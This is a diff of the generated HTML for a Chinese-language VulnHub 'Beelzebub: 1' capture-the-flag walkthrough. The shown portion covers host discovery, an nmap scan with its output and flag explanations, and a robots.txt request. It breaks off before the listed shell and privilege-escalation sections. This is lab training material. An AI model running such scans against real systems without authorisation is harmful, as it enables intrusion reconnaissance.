@@ -1,521 +1,2203 @@
-<!doctype html><html lang=en dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Beelzebub#提示：You have to enumerate as much as you can and don’t forget about the Base64.
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Beelzebub#提示：You have to enumerate as much as you can and don’t forget about the Base64.
 识别目标主机IP地址#这里用LingJing实验室环境，实则不需要识别，一般Kali中指令如下：
 sudo netdiscover -i eth1 ip addr192.168.242.230
 NMAP扫描#利用NMAP对目标主机进行全端口扫描，
 ┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.242.230 -oN nmap_full_scan Nmap scan report for 192.168.242.230 Host is up (0.00076s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA) | 256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA) |_ 256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519) 80/tcp open tcpwrapped |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 235.55 seconds（ps：关闭梯子），-sS是TCP SYN扫描（SYN“同步”，是TCP协议中的控制标志位，通过发送带有SYN标志位的TCP数据包到目标端口，根据接收到的响应类型，判断端口的开放状态，无需完成完整的三次握手），-sV是版本探测，-sC(Script)是默认脚本扫描，（-p-是全端口扫描，不用），（-T4(Timing Template)加快频率），-oN namp_full_scan(output noraml)将结果以标准格式保存到名为nmap_full_scan的文件中。 目标主机有2个开放端口22（SSH）、80（HTTP）
-"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#2e3440"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://vnccer.github.io/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/"><meta property="og:site_name" content="vnccer"><meta property="og:title" content="Beelzebub: 1"><meta property="og:description" content="Beelzebub#提示：You have to enumerate as much as you can and don’t forget about the Base64.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="Beelzebub: 1">
+  <meta property="og:description" content="Beelzebub#提示：You have to enumerate as much as you can and don’t forget about the Base64.
 识别目标主机IP地址#这里用LingJing实验室环境，实则不需要识别，一般Kali中指令如下：
 sudo netdiscover -i eth1 ip addr192.168.242.230
 NMAP扫描#利用NMAP对目标主机进行全端口扫描，
-┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.242.230 -oN nmap_full_scan Nmap scan report for 192.168.242.230 Host is up (0.00076s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA) | 256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA) |_ 256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519) 80/tcp open tcpwrapped |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 235.55 seconds（ps：关闭梯子），-sS是TCP SYN扫描（SYN“同步”，是TCP协议中的控制标志位，通过发送带有SYN标志位的TCP数据包到目标端口，根据接收到的响应类型，判断端口的开放状态，无需完成完整的三次握手），-sV是版本探测，-sC(Script)是默认脚本扫描，（-p-是全端口扫描，不用），（-T4(Timing Template)加快频率），-oN namp_full_scan(output noraml)将结果以标准格式保存到名为nmap_full_scan的文件中。 目标主机有2个开放端口22（SSH）、80（HTTP）"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-03-11T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-15T14:20:47+08:00"><meta itemprop=name content="Beelzebub: 1"><meta itemprop=description content="Beelzebub#提示：You have to enumerate as much as you can and don’t forget about the Base64.
+┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.242.230 -oN nmap_full_scan Nmap scan report for 192.168.242.230 Host is up (0.00076s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA) | 256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA) |_ 256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519) 80/tcp open tcpwrapped |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 235.55 seconds（ps：关闭梯子），-sS是TCP SYN扫描（SYN“同步”，是TCP协议中的控制标志位，通过发送带有SYN标志位的TCP数据包到目标端口，根据接收到的响应类型，判断端口的开放状态，无需完成完整的三次握手），-sV是版本探测，-sC(Script)是默认脚本扫描，（-p-是全端口扫描，不用），（-T4(Timing Template)加快频率），-oN namp_full_scan(output noraml)将结果以标准格式保存到名为nmap_full_scan的文件中。 目标主机有2个开放端口22（SSH）、80（HTTP）">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:published_time" content="2026-03-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-15T14:20:47+08:00">
+
+
+  <meta itemprop="name" content="Beelzebub: 1">
+  <meta itemprop="description" content="Beelzebub#提示：You have to enumerate as much as you can and don’t forget about the Base64.
 识别目标主机IP地址#这里用LingJing实验室环境，实则不需要识别，一般Kali中指令如下：
 sudo netdiscover -i eth1 ip addr192.168.242.230
 NMAP扫描#利用NMAP对目标主机进行全端口扫描，
-┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.242.230 -oN nmap_full_scan Nmap scan report for 192.168.242.230 Host is up (0.00076s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA) | 256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA) |_ 256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519) 80/tcp open tcpwrapped |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 235.55 seconds（ps：关闭梯子），-sS是TCP SYN扫描（SYN“同步”，是TCP协议中的控制标志位，通过发送带有SYN标志位的TCP数据包到目标端口，根据接收到的响应类型，判断端口的开放状态，无需完成完整的三次握手），-sV是版本探测，-sC(Script)是默认脚本扫描，（-p-是全端口扫描，不用），（-T4(Timing Template)加快频率），-oN namp_full_scan(output noraml)将结果以标准格式保存到名为nmap_full_scan的文件中。 目标主机有2个开放端口22（SSH）、80（HTTP）"><meta itemprop=datePublished content="2026-03-11T00:00:00+00:00"><meta itemprop=dateModified content="2026-05-15T14:20:47+08:00"><meta itemprop=wordCount content="1790"><title>Beelzebub: 1 | vnccer</title><link rel=icon href=/ak47.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://vnccer.github.io/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/><link rel=stylesheet href=/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.2f97d07853187a58b0d1c6f7546609fafa25e2267d955fa61f4874dde374b8b7.js integrity="sha256-L5fQeFMYeliw0cb3VGYJ+vol4iZ9lV+mH0h03eN0uLc=" crossorigin=anonymous></script><script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script><script>MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["\\[","\\]"]],processEscapes:!0,processEnvironments:!0},options:{skipHtmlTags:["script","noscript","style","textarea","pre"]}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script></head><body dir=ltr class="book-kind-page book-type-docs"><input type=checkbox class="hidden toggle" id=menu-control>
-<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/flamez.png alt=Logo><span>vnccer</span></a></h2><div class="book-search hidden"><input id=book-search-input type=text placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c860f18c28389564163849da32ed5d14 class=toggle>
-<label for=section-c860f18c28389564163849da32ed5d14 class=flex><a role=button>Project</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/project/vigil/>vigil</a></li><li><a href=/docs/project/vigil-abandoned-version/>vigil(abandoned version)</a></li></ul></li><li><input type=checkbox id=section-8d58ff5c5e366ab14339daed9d222b7f class=toggle checked>
-<label for=section-8d58ff5c5e366ab14339daed9d222b7f class=flex><a href=/docs/cybersecurity/>网安</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-ad627e53d6d1828a1435a85961eea27f class=toggle>
-<label for=section-ad627e53d6d1828a1435a85961eea27f class=flex><a role=button>xnwlaqbc靶机记录</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2%E4%B8%8E%E6%94%BB%E5%87%BB/>xnwlaqbc靶机部署与攻击</a></li><li><a href=/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/>DDos攻击测试日志</a></li></ul></li><li><input type=checkbox id=section-20b418ba6aa317c76a5b35dea36ccbca class=toggle>
-<label for=section-20b418ba6aa317c76a5b35dea36ccbca class=flex><a href=/docs/cybersecurity/DVWA/>DVWA</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/DVWA/dvwa%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BF%AE%E5%A4%8D/>dvwa初始化修复</a></li><li><a href=/docs/cybersecurity/DVWA/Authorisation-Bypass/>Authorisation Bypass</a></li><li><a href=/docs/cybersecurity/DVWA/CSRF/>CSRF</a></li><li><a href=/docs/cybersecurity/DVWA/Open-HTTP-Redirect/>Open HTTP Redirect</a></li><li><a href=/docs/cybersecurity/DVWA/API/>api</a></li><li><a href=/docs/cybersecurity/DVWA/CSP-Bypass/>CSP Bypass</a></li><li><a href=/docs/cybersecurity/DVWA/Cyptography/>Cryptography</a></li><li><a href=/docs/cybersecurity/DVWA/Command-Injection/>Command Injection</a></li><li><a href=/docs/cybersecurity/DVWA/File-Inclusion/>File Inclusion</a></li><li><a href=/docs/cybersecurity/DVWA/SQL-Injection/>SQL Injection</a></li></ul></li><li><a href=/docs/cybersecurity/kali_linux%E5%9F%BA%E6%93%8D/>kali_linux基操</a></li><li><input type=checkbox id=section-aa6f3e63fd33f2e9fa1487b55c3551ba class=toggle>
-<label for=section-aa6f3e63fd33f2e9fa1487b55c3551ba class=flex><a role=button>SRC</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/SRC/stepfun/>漏洞盒子：阶跃星辰安全应急响应中心</a></li></ul></li><li><input type=checkbox id=section-4ae5ffa90962cdf2660fe74526a01436 class=toggle>
-<label for=section-4ae5ffa90962cdf2660fe74526a01436 class=flex><a role=button>Vulnerabilities</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/>基于docker的log4j2（CVE-2021-44228）漏洞（源问题复现失败）</a></li></ul></li><li><input type=checkbox id=section-e003e03c1feb2b65c7b35f539ae39c73 class=toggle checked>
-<label for=section-e003e03c1feb2b65c7b35f539ae39c73 class=flex><a role=button>VULNHUB</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-ac34f5c7f66ad3765e4c61f98a3f46fd class=toggle checked>
-<label for=section-ac34f5c7f66ad3765e4c61f98a3f46fd class=flex><a role=button>easy</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_drippingblues/>drippingblues</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_doubletrouble_1/>doubletrouble: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/ class=active>Beelzebub: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Empire_Breakout/>Empire Breakout</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_ICA_1/>ICA: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/>jangow 1.0.1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Napping-1.0.1/>Napping: 1.0.1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Noob_1/>Noob: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_The-planets_earth/>The planets earth</a></li></ul></li><li><input type=checkbox id=section-ad44293ee93b1d26cf7c58190e7d4815 class=toggle>
-<label for=section-ad44293ee93b1d26cf7c58190e7d4815 class=flex><a role=button>medium</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub_Corrosion2/>Corrosion: 2</a></li><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/>Thales</a></li><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub_Empire_lupinone/>Empire lupinone</a></li></ul></li><li><input type=checkbox id=section-fb378fb748ece0ae1fdeedef24da3db6 class=toggle>
-<label for=section-fb378fb748ece0ae1fdeedef24da3db6 class=flex><a role=button>hard</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/hard/vulnhub_Matrix-Breakout_-2_Morpheus/>Matrix-Breakout: 2 Morpheus</a></li></ul></li></ul></li><li><input type=checkbox id=section-5b607fcbb0b7c699a3da0e65a2ffed9b class=toggle>
-<label for=section-5b607fcbb0b7c699a3da0e65a2ffed9b class=flex><a role=button>CTF</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-7a6315a3240f7682f305097cdf53ea82 class=toggle>
-<label for=section-7a6315a3240f7682f305097cdf53ea82 class=flex><a role=button>easy</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/CTF/easy/CTF-web-low/>web-low</a></li></ul></li><li><input type=checkbox id=section-f08add9f101710f9ba3d484a35d5581b class=toggle>
-<label for=section-f08add9f101710f9ba3d484a35d5581b class=flex><a role=button>medium</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-1fdf586d1ea5885edf0672ce206f530c class=toggle>
-<label for=section-1fdf586d1ea5885edf0672ce206f530c class=flex><a role=button>hard</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li></ul></li></ul></li><li><input type=checkbox id=section-94ed7c835fd2d66c69e86ff967d092f9 class=toggle>
-<label for=section-94ed7c835fd2d66c69e86ff967d092f9 class=flex><a href=/docs/papers/>论文</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/papers/%E5%9F%BA%E4%BA%8E%E5%8F%AF%E5%8F%98%E9%95%BF%E5%BA%8F%E5%88%97%E7%9A%84%E6%81%B6%E6%84%8F%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/>基于可变长序列的恶意加密流量检测方法</a></li><li><a href=/docs/papers/ET-BERT/>ET-BERT</a></li><li><a href=/docs/papers/ET-BERT%E5%A4%8D%E7%8E%B0/>ET-BERT复现</a></li><li><a href=/docs/papers/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%9F%BA%E7%A1%80/>加密流量基础</a></li><li><a href=/docs/papers/%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E6%9E%90/>数据集分析</a></li></ul></li><li><input type=checkbox id=section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed class=toggle>
-<label for=section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed class=flex><a role=button>工作</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/work/AI%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83/>AI安全思考</a></li><li><input type=checkbox id=section-2c262361fe9aa48cd5d939ca8724680d class=toggle>
-<label for=section-2c262361fe9aa48cd5d939ca8724680d class=flex><a role=button>leetcode</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-c1a97b113c65b26353860b399a4f8855 class=toggle>
-<label for=section-c1a97b113c65b26353860b399a4f8855 class=flex><a role=button>哈希</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/work/leetcode/1.%E5%93%88%E5%B8%8C/1.%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/>1.两数之和</a></li></ul></li></ul></li><li><a href=/docs/work/%E5%AE%9E%E4%B9%A0%E7%AE%80%E5%8E%86/>实习简历</a></li></ul></li><li><input type=checkbox id=section-8ebb29a2ddfb039e11169448c9cf3620 class=toggle>
-<label for=section-8ebb29a2ddfb039e11169448c9cf3620 class=flex><a href=/docs/skills/>技能</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/skills/Hugo%E6%9E%B6%E6%9E%84%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/>Hugo架构网站搭建指南</a></li><li><a href=/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/>anaconda环境配置</a></li><li><a href=/docs/skills/linux-clash%E9%83%A8%E7%BD%B2/>linux clash部署</a></li><li><a href=/docs/skills/pyenv%E7%AE%A1%E7%90%86python%E7%89%88%E6%9C%AC/>pyenv管理python版本</a></li><li><a href=/docs/skills/SwitchyOmega_mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/>SwitchyOmega_mv3操作记录</a></li><li><a href=/docs/skills/win+r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/>win+r常用指令</a></li><li><a href=/docs/skills/windows%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86/>windows终端/git 走代理</a></li><li><a href=/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali_linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/>基于vmware的kali_linux下的docker部署(坑多)</a></li></ul></li><li><input type=checkbox id=section-d096fa83268a84183f67ef634318f12c class=toggle>
-<label for=section-d096fa83268a84183f67ef634318f12c class=flex><a href=/docs/AI/>AI</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/AI/claude-code-cli/>claude code cli</a></li><li><a href=/docs/AI/%E4%B8%BB%E6%B5%81AI%E5%AE%9A%E4%BB%B7/>主流AI定价</a></li></ul></li><li><input type=checkbox id=section-854542c26bded6389f67b522f4182c5e class=toggle>
-<label for=section-854542c26bded6389f67b522f4182c5e class=flex><a role=button>导航门户</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/navigation/%E7%BD%91%E5%AE%89/>网安</a></li><li><a href=/docs/navigation/%E8%AE%BA%E6%96%87/>论文</a></li><li><a href=/docs/navigation/%E5%B7%A5%E4%BD%9C/>工作</a></li><li><a href=/docs/navigation/Function/>Function</a></li><li><a href=/docs/navigation/AI/>AI</a></li><li><a href=/docs/navigation/Life/>Life</a></li><li><a href=/docs/navigation/%E5%B9%B3%E5%8F%B0/>平台</a></li><li><a href=/docs/navigation/%E6%9C%BA%E5%9C%BA/>机场</a></li></ul></li></ul><ul><li><a href=/posts/ title=Blog>Blog</a></li><li><a href=https://github.com/vnccer target=_blank rel=noopener>Github</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class="book-header hidden"><div class="flex align-center justify-between"><label for=menu-control><img src=/icons/menu.svg class=book-icon alt=Menu></label><h3>Beelzebub: 1</h3><label for=toc-control><img src=/icons/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class=hidden><nav id=TableOfContents><ul><li><a href=#beelzebub>Beelzebub</a><ul><li><a href=#识别目标主机ip地址>识别目标主机IP地址</a></li><li><a href=#nmap扫描>NMAP扫描</a></li><li><a href=#获得shell>获得shell</a></li><li><a href=#提权>提权</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=beelzebub>Beelzebub<a class=anchor href=#beelzebub>#</a></h1><p>提示：You have to enumerate as much as you can and don&rsquo;t forget about the Base64.</p><h2 id=识别目标主机ip地址>识别目标主机IP地址<a class=anchor href=#%e8%af%86%e5%88%ab%e7%9b%ae%e6%a0%87%e4%b8%bb%e6%9c%baip%e5%9c%b0%e5%9d%80>#</a></h2><p>这里用LingJing实验室环境，实则不需要识别，一般Kali中指令如下：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-SHELL data-lang=SHELL><span style=display:flex><span>sudo netdiscover -i eth1
-</span></span><span style=display:flex><span>ip addr</span></span></code></pre></div><p>192.168.242.230</p><h2 id=nmap扫描>NMAP扫描<a class=anchor href=#nmap%e6%89%ab%e6%8f%8f>#</a></h2><p>利用NMAP对目标主机进行全端口扫描，</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ sudo nmap -sS -sV -sC -T4 192.168.242.230 -oN nmap_full_scan 
-</span></span><span style=display:flex><span>Nmap scan report <span style=color:#ff6ac1>for</span> 192.168.242.230
-</span></span><span style=display:flex><span>Host is up <span style=color:#ff6ac1>(</span>0.00076s latency<span style=color:#ff6ac1>)</span>.
-</span></span><span style=display:flex><span>Not shown: <span style=color:#ff9f43>998</span> filtered tcp ports <span style=color:#ff6ac1>(</span>no-response<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>PORT   STATE SERVICE    VERSION
-</span></span><span style=display:flex><span>22/tcp open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#ff6ac1>(</span>Ubuntu Linux; protocol 2.0<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>| ssh-hostkey: 
-</span></span><span style=display:flex><span>|   <span style=color:#ff9f43>2048</span> 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 <span style=color:#ff6ac1>(</span>RSA<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>|   <span style=color:#ff9f43>256</span> 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 <span style=color:#ff6ac1>(</span>ECDSA<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>|_  <span style=color:#ff9f43>256</span> b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 <span style=color:#ff6ac1>(</span>ED25519<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>80/tcp open  tcpwrapped
-</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 <span style=color:#ff6ac1>(</span>Ubuntu<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>|_http-title: Apache2 Ubuntu Default Page: It works
-</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style=display:flex><span>Nmap <span style=color:#ff6ac1>done</span>: <span style=color:#ff9f43>1</span> IP address <span style=color:#ff6ac1>(</span><span style=color:#ff9f43>1</span> host up<span style=color:#ff6ac1>)</span> scanned in 235.55 seconds</span></span></code></pre></div><p>（ps：关闭梯子），<code>-sS</code>是TCP SYN扫描（SYN“同步”，是TCP协议中的控制标志位，通过发送带有SYN标志位的TCP数据包到目标端口，根据接收到的响应类型，判断端口的开放状态，无需完成完整的三次握手），<code>-sV</code>是版本探测，<code>-sC</code>(Script)是默认脚本扫描，（<code>-p-</code>是全端口扫描，不用），（<code>-T4</code>(Timing Template)加快频率），<code>-oN namp_full_scan</code>(output noraml)将结果以标准格式保存到名为<code>nmap_full_scan</code>的文件中。
-目标主机有2个开放端口22（SSH）、80（HTTP）</p><h2 id=获得shell>获得shell<a class=anchor href=#%e8%8e%b7%e5%be%97shell>#</a></h2><p>目标主机openssh 7.6p1没有可利用的版本，接着分析80端口：
-url中输入ip，返回apache2的默认页面，查看源代码没有特别发现</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ curl http://192.168.242.230/robots.txt
-</span></span><span style=display:flex><span>&lt;!DOCTYPE HTML PUBLIC <span style=color:#5af78e>&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
-</span></span><span style=display:flex><span>&lt;html&gt;&lt;head&gt;
-</span></span><span style=display:flex><span>&lt;title&gt;404 Not Found&lt;/title&gt;
-</span></span><span style=display:flex><span>&lt;/head&gt;&lt;body&gt;
-</span></span><span style=display:flex><span>&lt;h1&gt;Not Found&lt;/h1&gt;
-</span></span><span style=display:flex><span>&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
-</span></span><span style=display:flex><span>&lt;hr&gt;
-</span></span><span style=display:flex><span>&lt;address&gt;Apache/2.4.29 <span style=color:#ff6ac1>(</span>Ubuntu<span style=color:#ff6ac1>)</span> Server at 192.168.242.230 Port 80&lt;/address&gt;
